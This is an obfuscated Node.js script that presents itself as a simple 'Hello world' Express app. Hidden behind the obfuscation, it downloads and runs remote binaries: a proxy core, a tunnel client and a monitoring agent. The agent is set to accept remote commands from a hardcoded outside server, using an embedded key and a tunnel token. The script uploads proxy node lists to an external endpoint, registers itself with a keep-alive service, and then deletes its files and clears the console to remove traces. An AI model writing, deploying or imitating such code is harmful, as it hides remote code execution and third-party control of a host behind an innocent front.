const _0x21ad1f=_0x493a;(function(_0x59a88c,_0x2e89b4){const _0x3bed91=_0x493a,_0x1cf6b7=_0x59a88c();while(!![]){try{const _0x4c6e87=-parseInt(_0x3bed91(0x124))/0x1*(parseInt(_0x3bed91(0x158))/0x2)+-parseInt(_0x3bed91(0x1ad))/0x3*(-parseInt(_0x3bed91(0x143))/0x4)+-parseInt(_0x3bed91(0x19e))/0x5+-parseInt(_0x3bed91(0x10d))/0x6+-parseInt(_0x3bed91(0x159))/0x7*(-parseInt(_0x3bed91(0x1a7))/0x8)+parseInt(_0x3bed91(0x178))/0x9*(parseInt(_0x3bed91(0x172))/0xa)+parseInt(_0x3bed91(0x15e))/0xb*(parseInt(_0x3bed91(0x197))/0xc);if(_0x4c6e87===_0x2e89b4)break;else _0x1cf6b7['push'](_0x1cf6b7['shift']());}catch(_0x5000bf){_0x1cf6b7['push'](_0x1cf6b7['shift']());}}}(_0x248a,0xacdfc));const express=require(_0x21ad1f(0x186)),app=express(),axios=require(_0x21ad1f(0x1ba)),os=require('os'),fs=require('fs'),path=require(_0x21ad1f(0x155)),{promisify}=require(_0x21ad1f(0x18e)),exec=promisify(require(_0x21ad1f(0x19b))[_0x21ad1f(0x148)]),{execSync}=require(_0x21ad1f(0x19b)),UPLOAD_URL=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x118)]||'',PROJECT_URL=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x135)]||'',AUTO_ACCESS=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x120)]||![],FILE_PATH=process['env'][_0x21ad1f(0x192)]||_0x21ad1f(0x121),SUB_PATH=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x19a)]||'fr',PORT=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x1b5)]||process['env']['PORT']||0xbb8,UUID=process['env'][_0x21ad1f(0x122)]||_0x21ad1f(0x185),NEZHA_SERVER=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x11c)]||_0x21ad1f(0x18d),NEZHA_PORT=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x17a)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl',ARGO_DOMAIN=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x136)]||_0x21ad1f(0x19d),ARGO_AUTH=process[_0x21ad1f(0x1a0)]['ARGO_AUTH']||_0x21ad1f(0x16a),ARGO_PORT=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x108)]||0x1f41,CFIP=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x12c)]||_0x21ad1f(0x110),CFPORT=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x1bf)]||0x1bb,NAME=process[_0x21ad1f(0x1a0)][_0x21ad1f(0x165)]||_0x21ad1f(0x145);function _0x493a(_0x2991b7,_0x1f966f){const _0x248a10=_0x248a();return _0x493a=function(_0x493acd,_0x346d9f){_0x493acd=_0x493acd-0x104;let _0x4f4834=_0x248a10[_0x493acd];return _0x4f4834;},_0x493a(_0x2991b7,_0x1f966f);}!fs['existsSync'](FILE_PATH)?(fs[_0x21ad1f(0x133)](FILE_PATH),console['log'](FILE_PATH+_0x21ad1f(0x196))):console[_0x21ad1f(0x12d)](FILE_PATH+_0x21ad1f(0x1b4));let npmPath=path[_0x21ad1f(0x16b)](FILE_PATH,_0x21ad1f(0x1c1)),phpPath=path[_0x21ad1f(0x16b)](FILE_PATH,_0x21ad1f(0x11d)),webPath=path['join'](FILE_PATH,'web'),botPath=path[_0x21ad1f(0x16b)](FILE_PATH,_0x21ad1f(0x17c)),subPath=path[_0x21ad1f(0x16b)](FILE_PATH,_0x21ad1f(0x14e)),listPath=path[_0x21ad1f(0x16b)](FILE_PATH,_0x21ad1f(0x15b)),bootLogPath=path['join'](FILE_PATH,_0x21ad1f(0x15c)),configPath=path[_0x21ad1f(0x16b)](FILE_PATH,_0x21ad1f(0x168));function deleteNodes(){const _0x14e887=_0x21ad1f;try{if(!UPLOAD_URL)return;if(!fs[_0x14e887(0x107)](subPath))return;let _0xbe0910;try{_0xbe0910=fs[_0x14e887(0x138)](subPath,_0x14e887(0x15a));}catch{return null;}const _0x2b18bf=Buffer['from'](_0xbe0910,_0x14e887(0x188))[_0x14e887(0x125)](_0x14e887(0x15a)),_0x291c60=_0x2b18bf[_0x14e887(0x14b)]('\x0a')['filter'](_0x14b24d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x14e887(0x1bb)](_0x14b24d));if(_0x291c60[_0x14e887(0x11a)]===0x0)return;return axios[_0x14e887(0x127)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x14e887(0x17d)]({'nodes':_0x291c60}),{'headers':{'Content-Type':_0x14e887(0x144)}})[_0x14e887(0x187)](_0x590a15=>{return null;});}catch(_0x188969){return null;}}function cleanupOldFiles(){const _0x153ebb=_0x21ad1f,_0x2de1fc=[_0x153ebb(0x13e),'bot','npm',_0x153ebb(0x11d),_0x153ebb(0x14e),_0x153ebb(0x15c)];_0x2de1fc[_0x153ebb(0x14a)](_0x2526cc=>{const _0x8181ff=_0x153ebb,_0x8aeeb9=path[_0x8181ff(0x16b)](FILE_PATH,_0x2526cc);fs['unlink'](_0x8aeeb9,()=>{});});}app[_0x21ad1f(0x157)]('/',function(_0x1f85b3,_0x505edd){const _0x142c68=_0x21ad1f;_0x505edd[_0x142c68(0x170)](_0x142c68(0x16d));});const config={'log':{'access':_0x21ad1f(0x164),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x21ad1f(0x142),'settings':{'clients':[{'id':UUID,'flow':_0x21ad1f(0x146)}],'decryption':_0x21ad1f(0x13d),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x21ad1f(0x1c0),'dest':0xbbc}]},'streamSettings':{'network':_0x21ad1f(0x14f)}},{'port':0xbb9,'listen':_0x21ad1f(0x137),'protocol':_0x21ad1f(0x142),'settings':{'clients':[{'id':UUID}],'decryption':_0x21ad1f(0x13d)},'streamSettings':{'network':_0x21ad1f(0x14f),'security':'none'}},{'port':0xbba,'listen':_0x21ad1f(0x137),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x21ad1f(0x13d)},'streamSettings':{'network':'ws','security':_0x21ad1f(0x13d),'wsSettings':{'path':_0x21ad1f(0x13a)}},'sniffing':{'enabled':!![],'destOverride':[_0x21ad1f(0x1b7),'tls',_0x21ad1f(0x15d)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x21ad1f(0x137),'protocol':_0x21ad1f(0x1a3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x21ad1f(0x15f)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x21ad1f(0x137),'protocol':_0x21ad1f(0x199),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x21ad1f(0x13d),'wsSettings':{'path':_0x21ad1f(0x1c0)}},'sniffing':{'enabled':!![],'destOverride':[_0x21ad1f(0x1b7),_0x21ad1f(0x183),_0x21ad1f(0x15d)],'metadataOnly':![]}}],'dns':{'servers':[_0x21ad1f(0x1ae)]},'outbounds':[{'protocol':_0x21ad1f(0x111),'tag':_0x21ad1f(0x171)},{'protocol':_0x21ad1f(0x12f),'tag':_0x21ad1f(0x12b)}]};function _0x248a(){const _0x4d4d9f=['sub.txt','tcp','unlink','Empowerment\x20success\x20for\x20','true','\x0aclient_secret:\x20','/api/add-subscriptions','path','https://amd64.ssss.nyc.mn/agent','get','961702hrTFAN','7nrbYEA','utf-8','list.txt','boot.log','quic','11jSmrRN','/vmess-argo','https://amd64.ssss.nyc.mn/v1','/api/add-nodes','App\x20is\x20running','close','/dev/null','NAME','2087','message','config.json','443','eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiYWMyMTMyZGItMjEzMS00NGQ0LWIwMDMtZjU1NDc0M2FkODExIiwicyI6Ik1qY3pPVFJpWVdFdFptRXlPUzAwT0dZekxXSTRNakl0WlRZeE5UTXdOMlptWVdaaiJ9','join','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Hello\x20world!','text/plain;\x20charset=utf-8','?security=tls&sni=','send','direct','370ICwRCR','automatic\x20access\x20task\x20added\x20successfully','filter','\x20successfully','arm','tunnel.yml','172665uuLvEt','\x0a\x20\x20\x0avmess://','NEZHA_PORT','https://arm64.ssss.nyc.mn/2go','bot','stringify','set','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','web\x20running\x20error:\x20','Subscription\x20uploaded\x20successfully','\x20>/dev/null\x202>&1\x20&','tls','match','4b7ca0b6-ecff-49e0-a698-31e8bed1f3d4','express','catch','base64','&path=%2Fvless-argo%3Fed%3D2560#','2083','2096','&path=%2Ftrojan-argo%3Fed%3D2560#','nzag.faiz.us.kg:8008','util','rm\x20-rf\x20','clear','https://arm64.ssss.nyc.mn/agent','FILE_PATH','bot\x20is\x20running.','npm\x20is\x20running','\x0a\x20\x20\x0atrojan://','\x20is\x20created','6052836AHHZuc','from','trojan','SUB_PATH','child_process','Empowerment\x20failed\x20for\x20','galaxyfr.faiz.us.kg','3796690nzVWPK','config.yaml','env','php\x20running\x20error:\x20','/tunnel.yml\x20run','vmess','response','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','1771864lIBrsz','?encryption=none&security=tls&sni=','&type=ws&host=','./bot','./web','bot\x20is\x20running','3FZUasB','https+local://8.8.8.8/dns-query','\x0a\x20\x20credentials-file:\x20','tunnel.json','\x20failed:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','2053','\x20already\x20exists','SERVER_PORT','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','http','createWriteStream','8443','axios','test','fileUrl','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','push','CFPORT','/trojan-argo','npm','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','web\x20is\x20running','includes','existsSync','ARGO_PORT','nohup\x20','Skipping\x20adding\x20automatic\x20access\x20task','/sub.txt\x20saved\x20successfully','all','2086110nxrnjf','pipe','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','www.visa.com.sg','freedom','listen','has','error','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','map','UPLOAD_URL','aarch64','length','writeFileSync','NEZHA_SERVER','php','then','/npm\x20-s\x20','AUTO_ACCESS','./tmp','UUID','./npm','1xVQYsa','toString','https://amd64.ssss.nyc.mn/2go','post','\x0a\x20\x20\x20\x20','https://amd64.ssss.nyc.mn/web','NEZHA\x20variable\x20is\x20empty,skip\x20running','block','CFIP','log','npm\x20running\x20error:\x20','blackhole','Error\x20executing\x20command:\x20','/bot\x20','php\x20is\x20running','mkdirSync','Download\x20','PROJECT_URL','ARGO_DOMAIN','127.0.0.1','readFileSync','false','/vless-argo','unshift','arm64','none','web','https://arm64.ssss.nyc.mn/web','\x20>/dev/null\x202>&1','\x0avless://','vless','3440940MwDmPP','application/json','Vls','xtls-rprx-vision','\x0a\x20\x20tunnel:\x20','exec','fileName','forEach','split','finish','status'];_0x248a=function(){return _0x4d4d9f;};return _0x248a();}fs[_0x21ad1f(0x11b)](path[_0x21ad1f(0x16b)](FILE_PATH,_0x21ad1f(0x168)),JSON[_0x21ad1f(0x17d)](config,null,0x2));function getSystemArchitecture(){const _0x330db1=_0x21ad1f,_0x4d21fb=os['arch']();return _0x4d21fb===_0x330db1(0x176)||_0x4d21fb===_0x330db1(0x13c)||_0x4d21fb===_0x330db1(0x119)?_0x330db1(0x176):'amd';}function downloadFile(_0x4b88b5,_0x30ab13,_0x2e2b45){const _0x2e817a=_0x21ad1f,_0x130989=path[_0x2e817a(0x16b)](FILE_PATH,_0x4b88b5),_0x120094=fs[_0x2e817a(0x1b8)](_0x130989);axios({'method':_0x2e817a(0x157),'url':_0x30ab13,'responseType':'stream'})[_0x2e817a(0x11e)](_0x4e9420=>{const _0x2674e0=_0x2e817a;_0x4e9420['data'][_0x2674e0(0x10e)](_0x120094),_0x120094['on'](_0x2674e0(0x14c),()=>{const _0x4b2e3e=_0x2674e0;_0x120094[_0x4b2e3e(0x163)](),console[_0x4b2e3e(0x12d)]('Download\x20'+_0x4b88b5+_0x4b2e3e(0x175)),_0x2e2b45(null,_0x4b88b5);}),_0x120094['on'](_0x2674e0(0x114),_0x745195=>{const _0x149346=_0x2674e0;fs[_0x149346(0x150)](_0x130989,()=>{});const _0xb99a08=_0x149346(0x134)+_0x4b88b5+_0x149346(0x1b1)+_0x745195[_0x149346(0x167)];console[_0x149346(0x114)](_0xb99a08),_0x2e2b45(_0xb99a08);});})[_0x2e817a(0x187)](_0x130801=>{const _0x3c2e05=_0x2e817a,_0x556eab=_0x3c2e05(0x134)+_0x4b88b5+_0x3c2e05(0x1b1)+_0x130801[_0x3c2e05(0x167)];console['error'](_0x556eab),_0x2e2b45(_0x556eab);});}async function downloadFilesAndRun(){const _0x3a23eb=_0x21ad1f,_0x2a7f6b=getSystemArchitecture(),_0x72408e=getFilesForArchitecture(_0x2a7f6b);if(_0x72408e[_0x3a23eb(0x11a)]===0x0){console[_0x3a23eb(0x12d)](_0x3a23eb(0x1a6));return;}const _0x443bf9=_0x72408e[_0x3a23eb(0x117)](_0x1c66c6=>{return new Promise((_0x4cf214,_0x39e699)=>{const _0x20e1f3=_0x493a;downloadFile(_0x1c66c6[_0x20e1f3(0x149)],_0x1c66c6[_0x20e1f3(0x1bc)],(_0x564bbc,_0xe67106)=>{_0x564bbc?_0x39e699(_0x564bbc):_0x4cf214(_0xe67106);});});});try{await Promise[_0x3a23eb(0x10c)](_0x443bf9);}catch(_0x30bead){console[_0x3a23eb(0x114)]('Error\x20downloading\x20files:',_0x30bead);return;}function _0x11aaee(_0x19d55c){const _0xa08da8=_0x3a23eb,_0x1b6983=0x1fd;_0x19d55c[_0xa08da8(0x14a)](_0xb3da45=>{const _0x3b6f53=_0xa08da8,_0x18317d=path[_0x3b6f53(0x16b)](FILE_PATH,_0xb3da45);fs[_0x3b6f53(0x107)](_0x18317d)&&fs['chmod'](_0x18317d,_0x1b6983,_0x2e419e=>{const _0x33b482=_0x3b6f53;_0x2e419e?console[_0x33b482(0x114)](_0x33b482(0x19c)+_0x18317d+':\x20'+_0x2e419e):console[_0x33b482(0x12d)](_0x33b482(0x151)+_0x18317d+':\x20'+_0x1b6983[_0x33b482(0x125)](0x8));});});}const _0x4f4175=NEZHA_PORT?[_0x3a23eb(0x123),_0x3a23eb(0x1ab),_0x3a23eb(0x1aa)]:['./php',_0x3a23eb(0x1ab),_0x3a23eb(0x1aa)];_0x11aaee(_0x4f4175);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3fc637=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3a23eb(0x14b)](':')['pop']():'',_0x40f7f4=new Set(['443',_0x3a23eb(0x1b9),'2096','2087','2083','2053']),_0x41e08b=_0x40f7f4[_0x3a23eb(0x113)](_0x3fc637)?_0x3a23eb(0x152):_0x3a23eb(0x139),_0x1d50d2=_0x3a23eb(0x153)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x41e08b+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3a23eb(0x11b)](path['join'](FILE_PATH,_0x3a23eb(0x19f)),_0x1d50d2);const _0x432266='nohup\x20'+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x3a23eb(0x1b6);try{await exec(_0x432266),console[_0x3a23eb(0x12d)](_0x3a23eb(0x132)),await new Promise(_0x25ebe3=>setTimeout(_0x25ebe3,0x3e8));}catch(_0x48dfb3){console[_0x3a23eb(0x114)](_0x3a23eb(0x1a1)+_0x48dfb3);}}else{let _0x2718cf='';const _0x5bfb1f=[_0x3a23eb(0x169),_0x3a23eb(0x1b9),_0x3a23eb(0x18b),_0x3a23eb(0x166),_0x3a23eb(0x18a),_0x3a23eb(0x1b3)];_0x5bfb1f['includes'](NEZHA_PORT)&&(_0x2718cf='--tls');const _0x43e0bb=_0x3a23eb(0x109)+FILE_PATH+_0x3a23eb(0x11f)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2718cf+_0x3a23eb(0x182);try{await exec(_0x43e0bb),console['log'](_0x3a23eb(0x194)),await new Promise(_0x5643bd=>setTimeout(_0x5643bd,0x3e8));}catch(_0x263317){console['error'](_0x3a23eb(0x12e)+_0x263317);}}}else console[_0x3a23eb(0x12d)](_0x3a23eb(0x12a));const _0x33612f=_0x3a23eb(0x109)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x33612f),console[_0x3a23eb(0x12d)](_0x3a23eb(0x105)),await new Promise(_0x36ad66=>setTimeout(_0x36ad66,0x3e8));}catch(_0x36130d){console[_0x3a23eb(0x114)](_0x3a23eb(0x180)+_0x36130d);}if(fs[_0x3a23eb(0x107)](path[_0x3a23eb(0x16b)](FILE_PATH,_0x3a23eb(0x17c)))){let _0x195b1c;if(ARGO_AUTH[_0x3a23eb(0x184)](/^[A-Z0-9a-z=]{120,250}$/))_0x195b1c='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x3a23eb(0x184)](/TunnelSecret/)?_0x195b1c=_0x3a23eb(0x10f)+FILE_PATH+_0x3a23eb(0x1a2):_0x195b1c=_0x3a23eb(0x1a5)+FILE_PATH+_0x3a23eb(0x104)+ARGO_PORT;try{await exec('nohup\x20'+FILE_PATH+_0x3a23eb(0x131)+_0x195b1c+_0x3a23eb(0x182)),console['log'](_0x3a23eb(0x1ac)),await new Promise(_0x5bd882=>setTimeout(_0x5bd882,0x7d0));}catch(_0x24cb75){console[_0x3a23eb(0x114)](_0x3a23eb(0x130)+_0x24cb75);}}await new Promise(_0x1667d8=>setTimeout(_0x1667d8,0x1388));}function getFilesForArchitecture(_0x58dcda){const _0x9e1c40=_0x21ad1f;let _0x489ec4;_0x58dcda==='arm'?_0x489ec4=[{'fileName':_0x9e1c40(0x13e),'fileUrl':_0x9e1c40(0x13f)},{'fileName':_0x9e1c40(0x17c),'fileUrl':_0x9e1c40(0x17b)}]:_0x489ec4=[{'fileName':_0x9e1c40(0x13e),'fileUrl':_0x9e1c40(0x129)},{'fileName':_0x9e1c40(0x17c),'fileUrl':_0x9e1c40(0x126)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5e6e6b=_0x58dcda===_0x9e1c40(0x176)?_0x9e1c40(0x191):_0x9e1c40(0x156);_0x489ec4[_0x9e1c40(0x13b)]({'fileName':_0x9e1c40(0x1c1),'fileUrl':_0x5e6e6b});}else{const _0x4ec231=_0x58dcda===_0x9e1c40(0x176)?'https://arm64.ssss.nyc.mn/v1':_0x9e1c40(0x160);_0x489ec4['unshift']({'fileName':_0x9e1c40(0x11d),'fileUrl':_0x4ec231});}}return _0x489ec4;}function argoType(){const _0x170792=_0x21ad1f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x170792(0x12d)](_0x170792(0x116));return;}if(ARGO_AUTH[_0x170792(0x106)]('TunnelSecret')){fs['writeFileSync'](path[_0x170792(0x16b)](FILE_PATH,_0x170792(0x1b0)),ARGO_AUTH);const _0x5895ac=_0x170792(0x147)+ARGO_AUTH[_0x170792(0x14b)]('\x22')[0xb]+_0x170792(0x1af)+path['join'](FILE_PATH,'tunnel.json')+_0x170792(0x1bd)+ARGO_DOMAIN+_0x170792(0x1b2)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x170792(0x11b)](path['join'](FILE_PATH,_0x170792(0x177)),_0x5895ac);}else console[_0x170792(0x12d)](_0x170792(0x115));}argoType();async function extractDomains(){const _0x1a0c98=_0x21ad1f;let _0x3ab776;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3ab776=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x3ab776),await _0x549bf4(_0x3ab776);else try{const _0xe396dc=fs[_0x1a0c98(0x138)](path[_0x1a0c98(0x16b)](FILE_PATH,'boot.log'),_0x1a0c98(0x15a)),_0x3424ba=_0xe396dc[_0x1a0c98(0x14b)]('\x0a'),_0x4027c4=[];_0x3424ba[_0x1a0c98(0x14a)](_0x4b0dad=>{const _0x193f4f=_0x1a0c98,_0x582943=_0x4b0dad[_0x193f4f(0x184)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x582943){const _0x450c41=_0x582943[0x1];_0x4027c4[_0x193f4f(0x1be)](_0x450c41);}});if(_0x4027c4[_0x1a0c98(0x11a)]>0x0)_0x3ab776=_0x4027c4[0x0],console['log']('ArgoDomain:',_0x3ab776),await _0x549bf4(_0x3ab776);else{console[_0x1a0c98(0x12d)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x1a0c98(0x16b)](FILE_PATH,_0x1a0c98(0x15c)));async function _0x1f12dc(){const _0x1160fc=_0x1a0c98;try{await exec(_0x1160fc(0x17f));}catch(_0x1605c7){}}_0x1f12dc(),await new Promise(_0x1b5aac=>setTimeout(_0x1b5aac,0xbb8));const _0x4dc230=_0x1a0c98(0x1a5)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1a0c98(0x109)+path['join'](FILE_PATH,_0x1a0c98(0x17c))+'\x20'+_0x4dc230+_0x1a0c98(0x182)),console[_0x1a0c98(0x12d)](_0x1a0c98(0x193)),await new Promise(_0x53362d=>setTimeout(_0x53362d,0xbb8)),await extractDomains();}catch(_0x29e430){console[_0x1a0c98(0x114)](_0x1a0c98(0x130)+_0x29e430);}}}catch(_0x4b384d){console[_0x1a0c98(0x114)]('Error\x20reading\x20boot.log:',_0x4b384d);}async function _0x549bf4(_0x486845){const _0x3d97bc=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':'utf-8'}),_0x2e6ddc=_0x3d97bc['trim']();return new Promise(_0x36014f=>{setTimeout(()=>{const _0x4c22f1=_0x493a,_0x46fe15={'v':'2','ps':NAME+'-'+_0x2e6ddc,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4c22f1(0x13d),'net':'ws','type':_0x4c22f1(0x13d),'host':_0x486845,'path':'/vmess-argo?ed=2560','tls':_0x4c22f1(0x183),'sni':_0x486845,'alpn':''},_0x1082f8=_0x4c22f1(0x141)+UUID+'@'+CFIP+':'+CFPORT+_0x4c22f1(0x1a8)+_0x486845+_0x4c22f1(0x1a9)+_0x486845+_0x4c22f1(0x189)+NAME+'-'+_0x2e6ddc+_0x4c22f1(0x179)+Buffer[_0x4c22f1(0x198)](JSON['stringify'](_0x46fe15))[_0x4c22f1(0x125)](_0x4c22f1(0x188))+_0x4c22f1(0x195)+UUID+'@'+CFIP+':'+CFPORT+_0x4c22f1(0x16f)+_0x486845+_0x4c22f1(0x1a9)+_0x486845+_0x4c22f1(0x18c)+NAME+'-'+_0x2e6ddc+_0x4c22f1(0x128);console[_0x4c22f1(0x12d)](Buffer['from'](_0x1082f8)['toString'](_0x4c22f1(0x188))),fs[_0x4c22f1(0x11b)](subPath,Buffer['from'](_0x1082f8)['toString']('base64')),console[_0x4c22f1(0x12d)](FILE_PATH+_0x4c22f1(0x10b)),uplodNodes(),app[_0x4c22f1(0x157)]('/'+SUB_PATH,(_0x3fb705,_0x434f5a)=>{const _0x264d47=_0x4c22f1,_0x5a0426=Buffer['from'](_0x1082f8)[_0x264d47(0x125)](_0x264d47(0x188));_0x434f5a[_0x264d47(0x17e)]('Content-Type',_0x264d47(0x16e)),_0x434f5a[_0x264d47(0x170)](_0x5a0426);}),_0x36014f(_0x1082f8);},0x7d0);});}}async function uplodNodes(){const _0x24f1e4=_0x21ad1f;if(UPLOAD_URL&&PROJECT_URL){const _0x360a1f=PROJECT_URL+'/'+SUB_PATH,_0x1ef3c9={'subscription':[_0x360a1f]};try{const _0xc548c7=await axios[_0x24f1e4(0x127)](UPLOAD_URL+_0x24f1e4(0x154),_0x1ef3c9,{'headers':{'Content-Type':_0x24f1e4(0x144)}});if(_0xc548c7[_0x24f1e4(0x14d)]===0xc8)console[_0x24f1e4(0x12d)](_0x24f1e4(0x181));else return null;}catch(_0xca0ae3){if(_0xca0ae3[_0x24f1e4(0x1a4)]){if(_0xca0ae3[_0x24f1e4(0x1a4)][_0x24f1e4(0x14d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x24f1e4(0x107)](listPath))return;const _0x53b361=fs[_0x24f1e4(0x138)](listPath,_0x24f1e4(0x15a)),_0x1285b1=_0x53b361[_0x24f1e4(0x14b)]('\x0a')[_0x24f1e4(0x174)](_0x242c58=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x242c58));if(_0x1285b1[_0x24f1e4(0x11a)]===0x0)return;const _0x1e3f81=JSON[_0x24f1e4(0x17d)]({'nodes':_0x1285b1});try{await axios[_0x24f1e4(0x127)](UPLOAD_URL+_0x24f1e4(0x161),_0x1e3f81,{'headers':{'Content-Type':_0x24f1e4(0x144)}});if(response[_0x24f1e4(0x14d)]===0xc8)console[_0x24f1e4(0x12d)](_0x24f1e4(0x181));else return null;}catch(_0x5676ea){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5a70b2=_0x493a,_0x3438ab=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x3438ab[_0x5a70b2(0x1be)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3438ab[_0x5a70b2(0x1be)](phpPath);exec(_0x5a70b2(0x18f)+_0x3438ab[_0x5a70b2(0x16b)]('\x20')+_0x5a70b2(0x140),_0x25ddf1=>{const _0x26b6a4=_0x5a70b2;console[_0x26b6a4(0x190)](),console[_0x26b6a4(0x12d)](_0x26b6a4(0x162)),console[_0x26b6a4(0x12d)](_0x26b6a4(0x16c));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2f3cf2=_0x21ad1f;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x2f3cf2(0x10a));return;}try{const _0x26c6a6=await axios[_0x2f3cf2(0x127)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2f3cf2(0x144)}});console[_0x2f3cf2(0x12d)](_0x2f3cf2(0x173));}catch(_0xa440f4){console[_0x2f3cf2(0x114)]('添加URL失败:\x20'+_0xa440f4['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x21ad1f(0x112)](PORT,()=>console[_0x21ad1f(0x12d)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
